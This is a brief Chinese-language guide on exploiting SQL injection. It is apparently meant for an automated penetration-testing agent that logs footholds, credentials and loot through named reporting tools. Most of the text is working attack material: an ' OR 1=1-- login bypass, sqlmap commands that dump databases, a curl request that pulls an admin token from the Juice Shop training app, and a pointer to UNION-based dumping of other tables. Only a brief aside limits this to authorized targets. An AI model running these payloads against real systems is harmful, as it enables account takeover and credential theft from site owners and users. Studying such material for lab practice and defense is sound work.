# 知识包：SQL 注入利用

目标不是"确认有注入"，而是**利用它拿到访问或数据**（认证绕过拿 token、dump 凭据）。

## 快速判断
- 参数注入单引号 `'` 看是否报错（`SQLITE_ERROR` / `SQL syntax` / `near "..."`）。
- 登录框试认证绕过：`email=' OR 1=1--`，password 任意。

## 利用（拿战果）
- sqlmap 自动化（授权目标）：
  - 查询参数：`sqlmap -u '<url>?q=1' --batch --level 3 --risk 2 --dump`
  - JSON body：`sqlmap -u <url> --data '{"email":"x","password":"y"}' --headers='Content-Type: application/json' --batch --dump`
- 手工认证绕过（更快）：直接 `curl` 发注入 payload，看是否返回登录 token。

## Juice Shop 典型
- `POST /rest/user/login`，JSON `{"email":"' OR 1=1--","password":"x"}` → 返回 admin 的 `authentication.token`（= web_admin 立足点）。
  验证：`curl -s -X POST <target>/rest/user/login -H 'Content-Type: application/json' -d '{"email":"'"'"' OR 1=1--","password":"x"}'`
- `GET /rest/products/search?q=` → UNION/报错注入，可 dump 其他表。

## 登记
- 拿到登录 token/session → `report_foothold(access_level=web_user 或 web_admin, evidence=真实响应片段)`
- dump 到用户名+hash → `report_credential(kind=hash, ...)`；dump 到数据 → `report_loot`
**证据纪律**：登记前确认响应里真有 token/数据，不要凭猜。
